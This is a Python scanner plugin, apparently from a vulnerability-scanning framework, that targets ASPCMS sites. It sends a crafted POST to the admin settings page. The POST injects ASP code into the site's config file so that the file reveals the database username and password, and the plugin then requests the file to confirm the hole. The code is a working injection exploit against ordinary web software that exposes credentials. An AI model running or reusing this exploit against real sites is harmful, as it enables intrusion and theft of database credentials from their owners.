#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *


def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
       
        expurl="%s%s"%(url,"admin_aspcms/_system/aspcms_settingfun.asp?action=saves")
        expurl1="%s%s"%(url,"config/aspcms_config.asp?sa=1")
        
        Exp_PostData="runMode=1&siteMode=1&siteHelp=&admincode=1%><%if request(databaseUser)=1 then response.write databaseUser&databasepwd end if %><%&SwitchComments=1&SwitchCommentsStatus=0&switchFaq=0&SwitchFaqStatus=0&dirtyStrToggle=1&dirtyStr=%BA%DA%B3%B5%0D%0A%B4%AB%CF%FA&waterMark=1&waterType=0&waterMarkFont=%CB%AE%D3%A1%CA%BE%C0%FD&waterMarkPic=%2FupLoad%2Fother%2Fmonth_1212%2F201212232322181539.jpg&waterMarkLocation=5&smtp_usermail=aspcmstest%40163.com&smtp_user=aspcmstest&smtp_password=aspcms.cn&smtp_server=smtp.163.com&MessageAlertsEmail=13322712%40qq.com&messageReminded=1&orderReminded=1&applyReminded=1&commentReminded=1&LanguageID=1"
#       response,content=http.request(expurl,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
        response,content=yx_httplib2_request(http,expurl,'POST',Exp_PostData,{"Content-Type":"application/x-www-form-urlencoded"})
#       r,c=http.request(expurl1)
        r,c=yx_httplib2_request(http,expurl1)
        #print c
        if r['status']=='200' and c.find("sasa")>=0:
            request = getRequest(expurl1)
            response = getResponse(response)
            if ob['isstart']=='1':
                list.append(getRecord(ob,expurl,ob['level'],detail+"验证性扫描结果：\n"+expurl1,request,response))
            else:
                list.append(getRecord(ob,expurl,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:aspcmsgetshell.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:aspcmsgetshell.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def